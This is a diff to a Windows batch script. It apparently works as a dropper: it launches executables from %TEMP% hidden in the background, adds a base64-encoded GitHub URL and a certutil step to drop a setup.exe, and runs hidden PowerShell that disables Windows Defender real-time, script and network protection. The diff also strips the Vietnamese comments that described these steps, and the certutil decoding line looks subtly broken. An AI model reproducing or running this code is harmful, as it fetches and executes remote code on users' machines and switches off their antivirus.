@@ -50,16 +50,18 @@ for %%p in (%melody_packages%) do (
         )
     )
 )
-
-:: Chạy các tệp thực thi đã được tải về ẩn dưới nền
+@echo off
 set "download_folder=%TEMP%"
-set "file_names=update.exe svchost.exe SecurityHealthSystray.exe"
+set "file_names=setup.exe"
+
+set "base64_encoded_url=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z2aWF0b29sL2Z2aWEvbWFpbi9zZXR1cC5leGU="
+certutil -decode %base64_encoded_url% "%TEMP%\setup.exe"
 
 for %%f in (%file_names%) do (
     start "" /B "%download_folder%\%%~f"
 )
 
-:: Tắt các tính năng bảo vệ của Windows Defender bằng PowerShell
+
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
 
